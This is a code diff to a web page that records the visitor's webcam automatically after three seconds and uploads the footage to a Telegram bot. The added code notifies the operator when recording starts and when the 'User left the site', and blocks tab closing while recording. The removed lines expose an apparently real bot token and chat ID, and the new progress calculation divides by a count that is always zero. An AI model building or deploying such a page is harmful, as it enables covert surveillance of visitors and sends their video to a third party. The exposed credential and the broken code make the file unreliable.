@@ -15,19 +15,28 @@
             width: 640px;
             height: 480px;
         }
+        #progress {
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
     <h1>Video Recording and Sending to Telegram</h1>
     <video id="video" autoplay></video>
     <video id="recordedVideo" controls></video>
+    <div id="progress">Progress: <span id="progressText">0%</span></div>
 
     <script>
         const video = document.getElementById('video');
         const recordedVideo = document.getElementById('recordedVideo');
+        const progressText = document.getElementById('progressText');
 
         let mediaRecorder;
         let recordedChunks = [];
+        let totalChunks = 0;
+
+        const token = 'YOUR_BOT_TOKEN'; // Замените на токен вашего бота
+        const chatId = 'YOUR_CHAT_ID'; // Замените на ваш chat ID
 
         // Function to start video
         function startVideo() {
@@ -41,6 +50,7 @@
                         setTimeout(() => {
                             mediaRecorder.start();
                             console.log('Recording started');
+                            sendNotificationToTelegram('User has started recording.');
                         }, 3000);
                     };
                 })
@@ -54,6 +64,7 @@
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) {
                     recordedChunks.push(event.data);
+                    updateProgress();
                 }
             };
 
@@ -62,14 +73,21 @@
                 const videoURL = URL.createObjectURL(blob);
                 recordedVideo.src = videoURL;
                 console.log('Recording stopped. Sending video...');
+                sendNotificationToTelegram('Recording stopped. Sending video...');
                 sendToTelegram(blob);
             };
         }
 
+        // Function to update progress
+        function updateProgress() {
+            if (mediaRecorder.state === 'recording') {
+                const percentage = Math.round((recordedChunks.length / totalChunks) * 100);
+                progressText.textContent = `${percentage}%`;
+            }
+        }
+
         // Function to send video to Telegram
         function sendToTelegram(blob) {
-            const token = '7504272107:AAH8rOfaUtOq8xnxWnvQ0s4SriLHkz4nITk'; // Замените на токен вашего бота
-            const chatId = '6121166273'; // Замените на ваш chat ID
             const url = `https://api.telegram.org/bot${token}/sendVideo`;
 
             const formData = new FormData();
@@ -84,11 +102,39 @@
             .then(data => {
                 if (data.ok) {
                     console.log('Video sent successfully:', data);
+                    sendNotificationToTelegram('Video sent successfully.');
+                } else {
+                    console.error('Telegram API error:', data.description);
+                    sendNotificationToTelegram('Error sending video to Telegram: ' + data.description);
+                }
+            })
+            .catch((error) => {
+                console.error('Error sending video to Telegram:', error);
+                sendNotificationToTelegram('Error sending video to Telegram: ' + error.message);
+            });
+        }
+
+        // Function to send notification to Telegram
+        function sendNotificationToTelegram(message) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('text', message);
+
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Notification sent successfully:', data);
                 } else {
                     console.error('Telegram API error:', data.description);
                 }
             })
-            .catch((error) => console.error('Error sending video to Telegram:', error));
+            .catch((error) => console.error('Error sending notification to Telegram:', error));
         }
 
         // Handle browser tab or window close
@@ -96,6 +142,7 @@
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop();
                 console.log('Recording stopped');
+                sendNotificationToTelegram('User left the site. Recording stopped.');
                 event.preventDefault(); // Required for modern browsers
                 event.returnValue = ''; // For some browsers
             }
